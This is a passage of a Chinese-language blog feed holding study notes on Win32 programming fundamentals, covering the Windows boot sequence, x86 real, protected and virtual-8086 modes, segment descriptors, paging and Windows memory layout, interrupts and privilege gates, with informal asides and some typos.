table区[分区表],占64个字节,该区相当于一个小程序,作用是判断哪个分区被标记为活动分区,然后去读取那个分区的启动区,并运行该分区中的代码.</span><br><span class="line">64个字节=16*4.只有4个主分区</span><br><span class="line">最后是一个55AA占2个字节的结束</span><br></pre></td></tr></table></figure><p>2.启动菜单生成</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Windows启动管理器读取&quot;启动配置数据存储[Boot Confi guration Data store]&quot;中的信息.此信息包含已被安装在计算机上的所有操作系统的配置信息,并且用以生成启动菜单</span><br></pre></td></tr></table></figure><p>当你启动菜单中选择下列动作的时候</p><ul><li>如果你选择的是:Windows 7</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Windows启动管理器[Windows Boot Manager]运的行%SystemRoot%\System32文件夹中的OS loader---Winload.exe</span><br></pre></td></tr></table></figure><ul><li>如果你选择的是:自休眠状态恢复Windows 7</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">那么启动管理器将装载Winresume.exe并恢复您先前的使用环境</span><br></pre></td></tr></table></figure><ul><li>如果你选择的是:早期Windows版本</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">启动管理器将定位系统安装所在的卷,并且加载Windows NT风格的早期OS loader(Ntldr.exe)---生成一个由boot.ini内容决定的启动菜单</span><br></pre></td></tr></table></figure><p>3.核心文件加载和登录</p><ul><li>windows7启动时,加载其核心文件Ntoskrnl.exe和hal.dll—从注册表中读取设置并加载驱动程序</li><li>接下来将运行Windows会话管理器(smss.exe)并且启动Windows启动程序(Wininit.exe)本地安全验证(Lsass.exe)和服务(services.exe)进程,完成后就可以登录系统了</li></ul><h2 id="1-实模式"><a href="#1-实模式" class="headerlink" title="1.实模式"></a>1.实模式</h2><ul><li><p>处理器被复位或者加电的时候以实模式启动</p></li><li><p>这时候处理器中各寄存器以实模式的初始化值互作</p></li><li><p>80386处理器在实模式下的存储器寻址方式和8086是一样的,由段寄存器的内容乘以16当作基地址,加上段内的偏移地址形成最终的物理地址,这时候它的32位地址只用了低20位</p></li><li><p>在实模式下,80386处理器不能对内存进行分页管理,所以指令寻址的地址就是内存中实际的物理地址,在实模式下,所有的段都是可以读.写和执行的</p></li><li><p>实模式下80386不支持优先级,所有的指令相当于互作在特权级,所以它可以执行所有特权指令,包括读写控制寄存器CR0等</p></li><li><p>实际上,80386就是通过在实模式下初始化控制寄存器,GDTR . LDTR . IDTR和TR等管理寄存器以及页表,然后再通过加载CR0使其中的保护模式使能位置位而进入保护模式的。当然实模式下不支持硬件上的多任务切换</p></li><li><p>实模式下的中断处理方式和8086处理器相同，也用中断向量表来定位中断服务程序地址</p></li><li><p>中断向量表的结构也和8086处理器一样：每4个字节组成一个中断向量，其中包括2个字节的段地址和2个字节的偏移地址</p></li><li><p>从编程的角度看，除了可以访问80386新增的一些寄存器外，实模式的80386处理器和8086有什么进步呢？</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">最大的好处是可以使用80386的32位寄存器，用32位寄存器进行编程可以使计算机更加快速</span><br></pre></td></tr></table></figure><ul><li>80386中增加的两个辅助段寄存器FS和GS再实模式下也可以使用，这样，同时可以访问的段到达了6个而不必考虑从小装入的问题；最后，很多80386的新增指令也使一些原来不方便的操作得以简化</li></ul><h2 id="2-保护模式"><a href="#2-保护模式" class="headerlink" title="2.保护模式"></a>2.保护模式</h2><ul><li>当80386互作再保护模式下的时候，它的所有功能都是可用的，这个时候80386所有的32根地址线都可供寻址，物理寻址空间高达4GB</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这个时候就不需要和8086一样有什么段地址什么偏移地址了，直接偏移地址就能索引到4GB的空间</span><br></pre></td></tr></table></figure><ul><li><p>再保护模式下，支持内存分页机制，提供了对虚拟内存的良好支持。虽然和8086可寻址的1MB物理地址空间相比，80386可寻址的物理地址很大，但实际的微机系统不可能安装如此大的物理内存。【这是在以前】所以，为了运行大型程序和真正实现多任务，虚拟内存【再硬盘上开辟一段空间，来当内存使用】是一种必要的技术</p></li><li><p>保护模式下80386支持多任务，可以依靠硬件仅再一条指令中实现任务切换。任务环境的保护互作是由处理器自动完成的</p></li><li><p>再保护模式下，80386处理器还支持优先级机制，不同的程序可以运行再不同的优先级上</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">优先级一共分为0~3一共4个级别，操作系统运行再最高的优先级0上，应用程序则运行再比较低的级别上</span><br></pre></td></tr></table></figure><ul><li>配合良好的检查机制后，既可以再任务间实现数据的安全共享也可以很好地隔离各个任务。从实模式切换到保护模式是通过修改控制寄存器CR0的控制位PE（位0）来实现的。再这之间还需要建立保护模式必须的一些数据表，如全局描述符表GDT和中断描述符表IDT等</li><li>ODS操作系统运行再实模式下，而Windows操作系统运行于保护模式下</li></ul><h2 id="3-虚拟8086模式"><a href="#3-虚拟8086模式" class="headerlink" title="3.虚拟8086模式"></a>3.虚拟8086模式</h2><ul><li><p>虽说实模式兼容以前的系统，但是设想一下，如果Windows或80386处理器推出的时候，不能运行MS-DOS程序，那么就等于放弃了一个巨大的软件库，，，这是不可能的</p></li><li><p>由于这种特殊需求的普遍性，虚拟8086就来啦</p></li><li><p>虚拟86模式是以任务形式再保护模式上执行的，再80386上可以同时支持由多个真正的80386任务和虚拟86模式构成的任务</p></li><li><p>再虚拟86模式下，80386支持任务切换和内存分页，再Windows 操作系统中，有一部分程序专门用来管理虚拟86模式的任务，称为虚拟86管理程序</p></li><li><p>既然虚拟86模式以保护模式位基础，它的互作方式实际上是实模式和保护模式的混合</p></li><li><p>为了和8086程序的寻址方式兼容，虚拟86模式采用和8086一样的寻址方式</p></li><li><p>但显然多个虚拟86模式不能同时使用同一位置的1MB地址空间，否则会有冲突。操作系统利用分页机制将不同虚拟86任务的地址空间映射到不同的物理地址上去，这样每个虚拟86任务看起来都任务自己在使用0~1MB的地址空间</p></li><li><p>8086代码中有相当一部分再保护模式下属于特权指令，如屏蔽中断的cli和中断返回指令iret等</p></li><li><p>这些指令再8086程序中是合法的。如果不让这些指令执行，8086代码就无法互作。为了解决这个问题，虚拟86管理程序采用模拟的方法来完成这些指令</p></li><li><p>虚拟86管理程序再异常处理程序中检查产生异常的指令，如果是中断指令，则从虚拟86任务的中断向量表中取出中断处理程序的入口地址，并将控制转移过去</p></li><li><p>如果是危机操作系统的指令，比如cli等，则简单地忽略这些指令，再异常处理程序返回的时候直接返回到下一条指令</p></li><li><p>通过这些措施，8086程序既可以正常的运行下去，再执行这些指令的时候又觉察不到已经被虚拟86管理程序做了手脚。MS-DOS应用程序再Windows操作系统中就是这样互作的</p></li></ul><h1 id="Windows的内存管理机制"><a href="#Windows的内存管理机制" class="headerlink" title="Windows的内存管理机制"></a>Windows的内存管理机制</h1><ul><li>在这一节中，我们需要通过学习解决两大疑问：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.win32汇编中，每个程序都可以用4GB的内存吗？</span><br><span class="line">2.Win32汇编源代码中为什么看不到CS,DS,ES和SS等段寄存器</span><br></pre></td></tr></table></figure><ul><li>DOS操作系统的内存安排</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Win32编程相对于DOS编程最大的区别之一就是内存的使用问题</span><br></pre></td></tr></table></figure><h2 id="1-DOS操作系统的内存安排"><a href="#1-DOS操作系统的内存安排" class="headerlink" title="1.DOS操作系统的内存安排"></a>1.DOS操作系统的内存安排</h2><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/img/image-20230418203047497.png" alt="image-20230418203047497"></p><ul><li><p>我们看到，由于8086处理器的寻址范围只有可怜的1MB大小，当时系统硬件使用的存储器地址被安排在高端</p></li><li><p>地址是从A0000H（即640KB）开始的384KB中，其中有用于显示的视频缓冲区和BIOS的地址空间</p></li><li><p>而在内存低端，安排了中断向量表和BIOS数据区；剩下从500h开始到A0000H总共不到640KB的内存是操作系统和应用程序所能够使用的；应用程序不可能使用这640KB以外的内存。这就是著名的“640KB限制”</p></li><li><p>而即使在这640KB中，DOS操作系统又占领了低端的一部分内存，最后剩下600KB左右的内存才是应用程序真正可以用的</p></li><li><p>如果系统中有内存驻留程序存在，那么应用程序还要和这些TSR程序共同分享这段内存空间</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">TSR:[Terminate and Stay Resident]指：内存驻留程序</span><br><span class="line">占着茅坑不拉屎的程序</span><br></pre></td></tr></table></figure><h2 id="2-80386的内存寻址机制"><a href="#2-80386的内存寻址机制" class="headerlink" title="2.80386的内存寻址机制"></a>2.80386的内存寻址机制</h2><ul><li>Windows的内存管理和DOS的内存管理有很大的不同，在了解Windows的内存管理模式之前，需要对80386保护模式下内存分页机制有所了解</li><li>为了做个对比，先来看实模式下的内存寻址方式：在实模式下，一个完整的地址由段地址和偏移地址俩部分组成【因为在实模式下和8086一样】</li><li>现在我们谈回到80386处理器的互作模式：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.当80386处理器互作在保护模式和虚拟8086模式的时候，可以使用全部32根地址访问4GB大的内存。段地址加偏移地址的计算方法显然无法覆盖这么大的范围</span><br><span class="line">2.但计算一下就可以发现，实在上和8086同样的限制以及不复存在，因为80386所有的通用寄存器都是32位的，2^32==4G，所以任何一个通用寄存器来间接寻址，不必分段就已经可以访问到所有的内存地址</span><br></pre></td></tr></table></figure><ul><li>这是不是说，在保护模式下，段寄存器就不在有用了呢？</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.错！实际上，段寄存器就更有用了，虽然在寻址上不在有分段的限制问题，但是在保护模式下，一个地址空间是否可以被写入，可以被多久优先级的代码写入。</span><br><span class="line">2.要解决这些问题，必须对一个地址空间定义一个安全上的属性。段寄存器这个时候就排上用场了，不妨将这些属性就放在段寄存器中</span><br></pre></td></tr></table></figure><ul><li><p>但是问题来了，涉及的属性和保护模式下的段的其他参数，要表示的信息需要用64位的数据才能表示。我们把64位的属性叫做段描述（Segment Descriptor）</p></li><li><p>但是！！80386的段寄存器任然是16位的，怎么办？</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">把所有段的段描述符顺序放在内存中的指定位置，组成一个段描述符表</span><br></pre></td></tr></table></figure><ul><li><p>而段寄存器中的16位用来做索引信息，指定这个段的属性用段描述符表中的第几个描述符来表示</p></li><li><p>这时，段寄存器中的信息不在是段地址了，而是段选择器（segment selector）。可以通过它在段描述符表中“选择”一个项目以得到段的全部信息</p></li><li><p>段描述符表放在哪里呢？</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">80386中引入了2个全新的寄存器来管理描述符表</span><br><span class="line">一个是48位的全局描述符表寄存器GDTR</span><br><span class="line">一个是16位的局部描述符表寄存器LDTR </span><br><span class="line">这俩个寄存器是用来管理描述符表的，不是描述符表！！</span><br></pre></td></tr></table></figure><ul><li><p>GDTR指向的描述符为全局描述符表GDT【Global Descriptor Table】它包含系统中所有任务都可用的段描述符，通常包含描述操作系统所使用的代码段，数据段和堆栈段和描述符及各任务的LDT段等；全局描述符表只有一个【也可以把这里理解成共有的属性】</p></li><li><p>LDTR则指向局部描述符表LDT（Local Descriptor Table）80386处理器设计成每个任务都有一个独立的LDT。它包含有每个任务私有的代码段，数据段，堆栈段的描述符，也包含该任务所使用的一些门描述符，比如：任务门和调用门描述符【这个和中断差差不多】</p></li><li><p>不同任务的局部描述符表分别组成不同的内存段，描述这些内存段的描述符当作系统描述符放在全局描述符表中</p></li><li><p>和GDTR直接指向内存地址不同，LDTR和CS,DS等段选择器一样只放在索引值，指向局部描述符表内存段对应的描述符在全局描述符表中的位置</p></li><li><p>随着任务的切换，只要改变LDTR的值，系统当前的局部描述符表LDT也随之切换，这样便于各任务之间数据的隔离，但GDT并不会随着任务的切换而切换</p></li><li><p>既然有全局描述符表和局部描述符表，那么段选择器【也就是段寄存器】中的索引值对应那个表中的描述符呢？</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.实际上，16位的段选择器只有高13位表示索引值</span><br><span class="line">2.剩下的3个数据位中，第0，1位标识程序的当前优先级RPL；第二位TI位用来表示在段描述符的位置；TI=0表示在GDT中;TI=1表示在LDT中</span><br></pre></td></tr></table></figure><ul><li>图说寻址路线：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.在保护模式下，同样在xxxx:yyyyyyyy格式表示一个虚拟地址</span><br><span class="line">2.注意：xxxx(16位，相当于8086时代的段地址)保存在段寄存器,yyyyyyyy(32位，相当于8086时代的偏移地址)保存在通用寄存器</span><br></pre></td></tr></table></figure><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/img/image-20230418231035003.png" alt="image-20230418231035003"></p><h2 id="3-80386的内存分页机制"><a href="#3-80386的内存分页机制" class="headerlink" title="3.80386的内存分页机制"></a>3.80386的内存分页机制</h2><ul><li>在 实模式下寻址的时候，”段寄存器+偏移地址“经过转换计算后得到的地址是”物理地址“，也就是在物理内存中的实际地址</li><li>而在保护模式下，”段选择器+偏移地址“转化后的地址被称为”线性地址“而不是”物理地址“。那么线性地址就是物理地址吗？</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">很显然，名字都不一样，肯定不一样啦</span><br><span class="line">这“是”or“不是”取决于80386的内存分页机制是否被使用</span><br></pre></td></tr></table></figure><ul><li>为什么会有内存分页机制？</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">就是为了解决下面的不足【内存碎片化】</span><br></pre></td></tr></table></figure><ul><li><p>我们先来回顾一下：在单任务的DOS系统中，一个应用程序可以使用所有的空闲内存，程序退出后，操作系统回收所有的碎片内存并且合并成一个大块内存继续供下一个程序使用【也就是单线程】</p></li><li><p>内存合并过程中的一个极端情况是当系统中有多个TSR程序时，早装入内存的TSR被卸载后，后装入的TSR会留在内存的中间部位，把空闲内存隔离成两个区域</p></li><li><p>这时应用程序使用的最大内存块只能是这两块内存中较大的一块，无法将它们合并使用</p></li><li><p>对于一个多任务的操作系统，内存的碎片化是不行的，否则经过一段时间后，即使空闲内存的总和很大，也可能出现任何一篇内存都小到无法装入执行程序的地步</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TSR差不多就是说，会把内存给隔开，不能连续起来一起使用咯</span><br></pre></td></tr></table></figure><ul><li><p>所以对于多任务操作系统中碎片内存的合并是一个很重要的问题</p></li><li><p>如何解决？</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">80386处理器的分页机制可以很好的解决这个问题，80386处理器把4KB大小的一块内存当作“一页”内存，每页物理内存可以根据“页目录”和“页表”，随意映射到不同的线性地址上</span><br><span class="line"></span><br><span class="line">这样，就可以将物理地址不连续的内存的映射连到一起，在线性地址上视为连续</span><br></pre></td></tr></table></figure><ul><li>在80386处理器中，除了和CR3寄存器（指定当前页目录的地址）相关的指令使用的是物理地址外，其他所有指令都是线性寻址的</li><li>什么是CR3？</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CR3用于保存页目录表页面的物理地址，因此被称为PDBR。由于目录是页对齐的，所以仅高20位有效，低12位保留。</span><br><span class="line">向CR3装入一个新值的时候，低12位必须是0，CR3中取值时，低12位被忽略</span><br></pre></td></tr></table></figure><ul><li>为什么是20位？</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">因为：在80386CPU中能索引的内存地址是4GB，然后一页是4KB</span><br><span class="line">4GB=4194304KB</span><br><span class="line">4194304KB/4KB=1048576=2^20</span><br><span class="line">所以只需要用到20位啦</span><br></pre></td></tr></table></figure><ul><li>还有是否启用内存分页机制是由80386处理器新增的CR0寄存器中的位31（PG位）决定的</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">如果PG=0,则分页机制不启用，这个时候指令的寻址地址（线性地址）页就是系统中的实际的物理地址</span><br><span class="line"></span><br><span class="line">如果PG=1，则80386分页机制开启，所有的线性地址要经过页表的映射才得到最后的物理地址</span><br></pre></td></tr></table></figure><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/img/image-20230418231107344.png" alt="image-20230418231107344"></p><ul><li>一个xxxx:yyyyyyyy格式的虚拟地址，经过段地址转换不走后得到一个32位的线性地址zzzzzzzz（步骤1）</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.当禁用分页机制时，线性地址就是物理地址，处理器直接从物理内存存取数据(步骤2)</span><br><span class="line">2.当启用分页机制时，得到线性地址的方法还是一样(步骤1’)但是还要根据页目录和页表指定的映射关系把地址映射到物理内存的真正位置上(步骤3’)</span><br><span class="line">3.然后，CPU以映射后的物理地址在物理内存中存取数据。这个过程是透明的</span><br></pre></td></tr></table></figure><ul><li><p>内存分页管理只能在保护模式下才可以实现，实模式不支持分页机制。但是不管在那种模式下，所有寻址指令使用的都是线性地址，程序不用关系数据最后究竟存放在物理内存的哪个地方</p></li><li><p>页表规定的不仅是地址的映射，同时还规定了页访问属性。如：是否可写，可读和可执行等。比如把代码所在的内存页属性设置位可读和可执行，那么权限不够的代码向他写数据就会发生保护异常。用这个机制可以在硬件层次上直接虚拟内存的实现</p></li><li><p>页表可以指定一个页面并不真正映射到物理内存中。这样，访问这个页的指令会引发页异常错误。这时，处理器会自动转移到页异常处理程序中去</p></li><li><p>操作系统可以在异常处理程序中将硬盘上的虚拟内存读到内存中并修改表重新映射，然后重新执行引发异常的指令</p></li><li><p>这样就可以正常的执行下去</p></li></ul><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/img/image-20230418232514773.png" alt="image-20230418232514773"></p><h2 id="4-Windows的内存安排"><a href="#4-Windows的内存安排" class="headerlink" title="4.Windows的内存安排"></a>4.Windows的内存安排</h2><ul><li>这节课有3个概念</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.每个应用程序都有自己的4GB的寻址空间，就算这个程序只占有1KB的内存</span><br><span class="line">2.不同应用程序的线性地址空间是隔离的，尽管他们在内存是搞在一起的</span><br><span class="line">3.时刻要记住,DLL程序是“小三”，因此他们没有自己的私有空间</span><br></pre></td></tr></table></figure><ul><li>虚拟内存安排</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.windows系统一般在硬盘上建立大小为物理内存2倍左右的交换文件用作虚拟内存</span><br><span class="line">2.利用80386处理器的内存分页机制，交换文件的寻址上可以很方便的为物理内存使用【只需要在真正调用的时候将其读入物理内存并同时修改线性地址映射到这块内存即可】</span><br><span class="line">3.同样道理，反正是映射一个地址而已，所以被执行的程序也可以不必装入内存，只需要在页表中建立映射关系，真正运行到这段代码才调入内存</span><br></pre></td></tr></table></figure><ul><li>众所周知，Windows是一个分时的多任务操作系统，CPU时间【就是CPU运行的过程】被分为一个个的时间片后分配给不同程序轮流使用</li><li>在A程序的时间片中，和这个程序执行无关的部分【B和C和其他程序的代码和数据】并不需要映射到线                                                                 性地址中</li><li>附加解析：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.内存中，所有的程序都搞在一起，关系十分混乱</span><br><span class="line">2.CPU只能看到线性地址【假的】，每个程序拥有自己的线性地址【DLL】</span><br></pre></td></tr></table></figure><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/img/image-20230419143136426.png" alt="image-20230419143136426"></p><h3 id="WIN32编程中几个很重要的概念"><a href="#WIN32编程中几个很重要的概念" class="headerlink" title="WIN32编程中几个很重要的概念"></a>WIN32编程中几个很重要的概念</h3><ul><li>第一个</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.每个应用程序都有自己的4GB的寻址空间【假的】</span><br><span class="line">2.该空间可存放操作系统，系统DLL和用戶DLL的代碼，他们之中有各种函数供应用程序调用</span><br><span class="line">3.再出去其他的一些空间，余下的是应用程序的代码，数据和可以分配的地址空间</span><br><span class="line"></span><br><span class="line">DLL动态链接库</span><br></pre></td></tr></table></figure><ul><li>第二个</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.不同应用程序的线性地址空间是隔离的</span><br><span class="line">2.虽然它们在物理内存中同时存在，但是在某个程序所属的时间片中，其他应用程序的代码和数据没有被映射到可寻址的线性地址中，所以是不可访问的</span><br><span class="line">3.从编程的角度看，程序可以使用4GB的寻址空间，而且这个空间是“私有”的</span><br></pre></td></tr></table></figure><ul><li>第三点</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.DLL程序没有自己“私有”的空间</span><br><span class="line">2.它们总是被映射到其他应用程序的地址空间中，当作其他应用程序的一部分运行</span><br><span class="line">3.原因很简单，如果它不和其他程序同属一个地址空间，应用程序就调用不到它</span><br><span class="line"></span><br><span class="line">CPU只能看到这个时间片中的内容，看不到其他</span><br></pre></td></tr></table></figure><h2 id="5-从WIN32汇编的角度看内存寻址"><a href="#5-从WIN32汇编的角度看内存寻址" class="headerlink" title="5.从WIN32汇编的角度看内存寻址"></a>5.从WIN32汇编的角度看内存寻址</h2><ul><li>WIN32汇编中的内存访问远比DOS下的分段寻址方式简单，why？</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">because windows是一个多任务的操作系统，最首要的宗旨就是“稳定压倒一切”如果把描述符表以及页表等内容交给用户程序管理是很不安全的</span><br></pre></td></tr></table></figure><ul><li>  任何权限开放引发的安全问题都是很严重的</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">如，windows 9x中的中断描述符表是可写的，CIH病毒可利用它将自己的权限提高到优先级0</span><br></pre></td></tr></table></figure><ul><li><p>而windows NT 下的中断描述符表就不能写了哦</p></li><li><p>windows操作系统帮用户“安排好了一切”</p></li><li><p>用户程序的代码段，数据段和堆栈段全部预定义好了段描述符。这些段的起始地址为0，限长ffffffff，所以用它们可以直接寻址全部的4GB地址空间</p></li><li><p>程序在开始执行的时候，CS，DS，ES，SS都已经指向了正确的描述符，在整个程序的生命周期内，程序员不必改动这些段寄存器，也不必关心它们的值是多少【因为想改也改不了】</p></li></ul><h1 id="windows的特权保护"><a href="#windows的特权保护" class="headerlink" title="windows的特权保护"></a>windows的特权保护</h1><ul><li>windows的特权保护和处理器硬件的支持是分布来的</li><li>优先级的划分，指令的权限和超出权限访问的异常处理等是构成特权保护的基础</li><li>有2个问题需要解决</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.win32汇编中为什么找不到中断指令？</span><br><span class="line">2.windows错误的“蓝屏”是从哪里来的？ </span><br></pre></td></tr></table></figure><h2 id="1-80386的中断和异常"><a href="#1-80386的中断和异常" class="headerlink" title="1.80386的中断和异常"></a>1.80386的中断和异常</h2><ul><li>什么是中断？</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">- 中断指当程序执行过程中有更重要的事情需要实时处理的时候【如串口中有数据到达，不及时处理数据会丢失，串行控制器就提交了一个中断信号给处理器要求处理】，硬件通过中断控制器通知处理器</span><br><span class="line">- 接到命令后，处理器暂时挂起当前运行的程序，转移到中断处理程序中</span><br><span class="line">- 当中断处理程序处理完毕后，通过iret指令回到原先被打断的程序中继续执行</span><br></pre></td></tr></table></figure><ul><li>什么是异常？</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">- 异常指令执行中发生不可忽略的错误的时候【比如遇到无效的指令编码，除法指令除0之类的】处理器用和中断处理相同的操作方法挂起当前运行的程序转移到异常处理程序中</span><br><span class="line">- 异常处理程序决定在修正错误后时候回到原来的地方继续执行</span><br><span class="line">- 中断和异常的处理的方式是一样的，引发方式不同</span><br></pre></td></tr></table></figure><ul><li>实模式下的中断或者异常处理</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.实模式下的中断和异常服务程序地址放在中断向量表中</span><br><span class="line">2.中断向量表位于物理内存中，每个中断向量是一个xxxx:yyyy格式的地址，占用4个字节</span><br><span class="line">3.当发生n号中断或者异常的时候，或者执行到int n指令的时候，CPU首先到内存n*4的地方取出服务程序的地址aaaa:bbbb</span><br><span class="line">4.然后将标志寄存器，中断时的CS IP压入堆栈，然后转移到aaaa:bbbb处执行</span><br></pre></td></tr></table></figure><ul><li><p>保护模式下，中断或异常处理往往从用户代码切换到操作系统代码中执行</p></li><li><p>由于保护模式下的代码分优先级，因此出现了从低到高……</p></li><li><p>为了使高优先级的代码能够安全的被低优先级代码调用，在保护模式下增加了“门”的概念</p></li><li><p>“门”指向某个优先级高的程序所规定的入口点，所有优先级低的程序调用优先级高的程序只能通过门重定向，进入门所规定的入口点</p></li><li><p>这样可以避免低级别的程序代码从任意位置进入优先级高的程序的问题</p></li><li><p>保护模式下的中断和异常等服务程序也要从“门”进入，80386的门分为中断门，自陷门，和任务门</p></li></ul><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/img/image-20230420135910000.png" alt="image-20230420135910000"></p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/img/image-20230420140206634.png" alt="image-20230420140206634"></p><ul><li><p>在保护模式下把所有的中断描述符放在一起组成‘’中断描述符表IDT“为此80386处理器引入了一个新的48位寄存器IDTR。IDTR的高32位指定了IDT在内存中的基址【线性地址】，低16位指定了IDT的长度，相当于指定了可以支持的中断数量</p></li><li><p>保护模式下发生异常或中断时，处理器先根据IDTR寄存器得到中断描述符的地址，然后取出n号中断/异常的门描述符，再从描述符中得到中断服务程序的地址：xxxx:yyyyyyyy，经过段地址转换后得到服务程序的32位线性地址并转移后执行</p></li><li><p>在windows中，操作系统使用动态链接库来代替中断服务程序提供系统功能，所以在win32汇编中int指令也就失去了存在的意义。这就是在win32汇编代码中看不到int指令的原因。其实那些调用api的指令原本就是用int指令实现的</p></li><li><p>windows会在处理程序中经常系统会用”蓝屏“来通知用户程序视图访问不存在的内存页</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> WIN32程序设计 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>8086汇编-基础知识（1）</title>
      <link href="/2023/05/01/8086%E6%B1%87%E7%BC%96-1-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
      <url>/2023/05/01/8086%E6%B1%87%E7%BC%96-1-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
      
